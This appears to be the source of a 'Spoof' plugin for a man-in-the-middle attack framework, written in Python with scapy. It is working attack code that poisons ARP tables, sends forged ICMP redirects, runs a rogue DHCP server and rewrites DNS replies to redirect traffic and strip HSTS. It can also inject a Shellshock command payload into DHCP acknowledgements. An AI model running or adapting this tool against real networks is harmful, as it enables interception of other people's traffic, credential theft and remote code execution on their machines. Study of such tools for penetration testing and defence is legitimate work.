from plugins.plugin import Plugin
from time import sleep
import dns.resolver
from netfilterqueue import NetfilterQueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
import os
import sys
import threading
from base64 import b64decode
from urllib import unquote
import binascii
import random

class Spoof(Plugin):
	name     = "Spoof"
	optname  = "spoof"
	desc     = "Redirect/Modify traffic using ICMP, ARP or DHCP"
	version  = "0.4"
	has_opts = True
	req_root = True

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.dnscfg = options.configfile['Spoof']['DNS']
		self.dhcpcfg = options.configfile['Spoof']['DHCP']
		self.hstscfg = options.configfile['SSLstrip+']
		self.target = options.target
		self.manualiptables = options.manualiptables
		
		#Makes scapy more verbose
		debug = False
		if self.options.log_level is 'debug': 
			debug = True

		self.sysconfig = SystemConfig(options.listen)

		if options.arp:
			if not options.gateway:
				sys.exit("[-] --arp argument requires --gateway")

			self.sysconfig.set_forwarding(1)
			
			if not options.manualiptables:
				self.sysconfig.iptables_flush()
				self.sysconfig.iptables_http()

			self.arp = _ARP(options.gateway, options.interface, options.mac_address)
			self.arp.target = options.target
			self.arp.arpmode = options.arpmode
			self.arp.debug = debug
			self.arp.start()

		elif options.icmp:
			if not options.gateway:
				sys.exit("[-] --icmp argument requires --gateway")
			if not options.target:
				sys.exit("[-] --icmp argument requires --target")

			self.sysconfig.set_forwarding(1)
			
			if not options.manualiptables:
				self.sysconfig.iptables_flush()
				self.sysconfig.iptables_http()

			self.icmp = _ICMP(options.interface, options.target, options.gateway, options.ip_address)
			self.icmp.debug = debug
			self.icmp.start()

		elif options.dhcp:
			if options.target:
				sys.exit("[-] --target argument invalid when DCHP spoofing")

			self.sysconfig.set_forwarding(1)
			
			if not options.manualiptables:
				self.sysconfig.iptables_flush()
				self.sysconfig.iptables_http()

			self.dhcp = _DHCP(options.interface, self.dhcpcfg, options.ip_address, options.mac_address)
			self.dhcp.shellshock = options.shellshock
			self.dhcp.debug = debug
			self.dhcp.start()
  
		else:
			sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")


		if (options.dns or options.hsts):

			if not options.manualiptables:
				self.sysconfig.iptables_dns()

			self.dns = _DNS(self.dnscfg, self.hstscfg)
			self.dns.dns = options.dns
			self.dns.hsts = options.hsts
			self.dns.start()

	def add_options(self, options):
		group = options.add_mutually_exclusive_group(required=False)
		group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
		group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
		group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
		options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
		options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
		options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
		options.add_argument('--target', dest='target', default=None, help='Specify a host to poison [default: subnet]')
		options.add_argument('--arpmode', dest='arpmode', default='req', choices=["req", "rep"], help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
		#options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')

		#added by alexander.georgiev@daloo.de
		options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')

	def finish(self):
		if self.options.arp:
			self.arp.stop()
			sleep(3)

			self.arp.arp_inter = 1
			if self.target:
				print "\n[*] Re-ARPing target"
				self.arp.reARP_target(5)

			print "\n[*] Re-ARPing network" 
			self.arp.reARP_net(5)

		elif self.options.icmp:
			self.icmp.stop()
			sleep(3)

		if (self.options.dns or self.options.hsts):
			self.dns.stop()

		if not self.manualiptables:
			self.sysconfig.iptables_flush()

		self.sysconfig.set_forwarding(0)

class SystemConfig():

	def __init__(self, http_redir_port):

		self.http_redir_port = http_redir_port

	def set_forwarding(self, value):
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
			file.write(str(value))
			file.close()

	def iptables_flush(self):
		os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')

	def iptables_http(self):
		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.http_redir_port)

	def iptables_dns(self):
		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

class _DHCP():

	def __init__(self, interface, dhcpcfg, ip, mac):
		self.interface   = interface
		self.ip_address  = ip
		self.mac_address = mac
		self.shellshock  = None
		self.debug       = False
		self.dhcpcfg     = dhcpcfg
		self.rand_number = []
		self.dhcp_dic    = {}

	def start(self):
		t = threading.Thread(name="dhcp_spoof", target=self.dhcp_sniff, args=(self.interface,))
		t.setDaemon(True)
		t.start()

	def dhcp_sniff(self, interface):
		sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=interface)

	def dhcp_rand_ip(self):
		pool = self.dhcpcfg['ip_pool'].split('-')
		trunc_ip = pool[0].split('.'); del(trunc_ip[3])
		max_range = int(pool[1])
		min_range = int(pool[0].split('.')[3])
		number_range = range(min_range, max_range)
		for n in number_range:
			if n in self.rand_number:
				number_range.remove(n)
		rand_number = random.choice(number_range)
		self.rand_number.append(rand_number)
		rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)

		return rand_ip

	def dhcp_callback(self, resp):
		if resp.haslayer(DHCP):
			xid = resp[BOOTP].xid
			mac_addr = resp[Ether].src
			raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
			if xid in self.dhcp_dic.keys():
				client_ip = self.dhcp_dic[xid]
			else:
				client_ip = self.dhcp_rand_ip()
				self.dhcp_dic[xid] = client_ip

			if resp[DHCP].options[0][1] is 1:
				logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
				logging.info("Sending DHCP OFFER")
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "offer"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240),
					"end"]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				sendp(packet, iface=self.interface, verbose=self.debug)

			if resp[DHCP].options[0][1] is 3:
				logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "ack"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240)]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				if self.shellshock:
					logging.info("Sending DHCP ACK with shellshock payload")
					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
					packet[DHCP].options.append("end")
				else:
					logging.info("Sending DHCP ACK")
					packet[DHCP].options.append("end")

				sendp(packet, iface=self.interface, verbose=self.debug)

class _ICMP():

	def __init__(self, interface, target, gateway, ip_address):

		self.target        = target
		self.gateway       = gateway
		self.interface     = interface
		self.ip_address    = ip_address
		self.debug         = False
		self.send          = True
		self.icmp_interval = 2

	def build_icmp(self):
		pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
			  IP(src=self.target, dst=self.gateway)/UDP()

		return pkt

	def start(self):
		pkt = self.build_icmp()

		t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug,))
		t.setDaemon(True)
		t.start()

	def stop(self):
		self.send = False

	def send_icmps(self, pkt, interface, debug):
		while self.send:
			sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)

class _ARP():

	def __init__(self, gateway, interface, mac):

		self.gateway    = gateway
		self.gatewaymac = getmacbyip(gateway)
		self.mac        = mac
		self.target     = None
		self.targetmac  = None
		self.interface  = interface
		self.arpmode    = 'req'
		self.debug      = False
		self.send       = True
		self.arp_inter  = 2

	def start(self):
		if self.gatewaymac is None:
			sys.exit("[-] Error: Could not resolve gateway's MAC address")

		if self.target:
			self.targetmac = getmacbyip(self.target)
			if self.targetmac is None:
				sys.exit("[-] Error: Could not resolve target's MAC address")

		if self.arpmode is 'req':
			pkt = self.build_arp_req()
		
		elif self.arpmode is 'rep':
			pkt = self.build_arp_rep()

		t = threading.Thread(name='arp_spoof', target=self.send_arps, args=(pkt, self.interface, self.debug,))
		t.setDaemon(True)
		t.start()

	def send_arps(self, pkt, interface, debug):
		while self.send:
			sendp(pkt, inter=self.arp_inter, iface=interface, verbose=debug)

	def stop(self):
		self.send = False

	def build_arp_req(self):
		if self.target is None:
			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
		elif self.target:
			pkt = Ether(src=self.mac, dst=self.targetmac)/\
			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target)

		return pkt

	def build_arp_rep(self):
		if self.target is None:
			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
		elif self.target:
			pkt = Ether(src=self.mac, dst=self.targetmac)/\
			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target, op=2)

		return pkt

	def reARP_net(self, count):
		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
		ARP(psrc=self.gateway, hwsrc=self.gatewaymac, op=2)

		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)

	def reARP_target(self, count):
		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
		ARP(psrc=self.target, hwsrc=self.targetmac, op=2)

		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)

class _DNS():

	def __init__(self, hstscfg, dnscfg):
		self.hsts = False
		self.dns = True
		self.dnscfg = hstscfg
		self.hstscfg = dnscfg
		self.nfqueue = NetfilterQueue()

	def start(self):
		t = threading.Thread(name='dns_nfqueue', target=self.nfqueue_bind, args=())
		t.setDaemon(True)
		t.start()

	def nfqueue_bind(self):
		self.nfqueue.bind(1, self.nfqueue_callback, 3)
		self.nfqueue.run()

	def stop(self):
		try:
			self.nfqueue.unbind()
		except:
			pass

	def resolve_domain(self, domain):
		try:
			logging.debug("Resolving -> %s" % domain)
			answer = dns.resolver.query(domain, 'A')
			real_ips = []
			for rdata in answer:
				real_ips.append(rdata.address)

			if len(real_ips) > 0:
				return real_ips

		except Exception:
			logging.info("Error resolving " + domain)

	def nfqueue_callback(self, payload):
		pkt = IP(payload.get_payload())
		if not pkt.haslayer(DNSQR):
			payload.accept()
		else:
			logging.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
			if self.dns:
				for k, v in self.dnscfg.items():
					if k in pkt[DNSQR].qname:
						self.modify_dns(payload, pkt, v)

			elif self.hsts:
				if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
					for k,v in self.hstscfg.items():
						if v == pkt[DNSQR].qname[:-1]:
							ip = self.resolve_domain(k)
							if ip:
								self.modify_dns(payload, pkt, ip)

					if 'wwww' in pkt[DNSQR].qname:
						ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
						if ip:
							self.modify_dns(payload, pkt, ip)

					if 'web' in pkt[DNSQR].qname:
						ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
						if ip:
							self.modify_dns(payload, pkt, ip)

	def modify_dns(self, payload, pkt, ip):
		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
		DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)

		if self.hsts:
			spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
			for i in ip:
				spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
			logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
			payload.set_payload(str(spoofed_pkt))
			payload.accept()

		if self.dns:
			spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
			logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
			payload.set_payload(str(spoofed_pkt))
			payload.accept()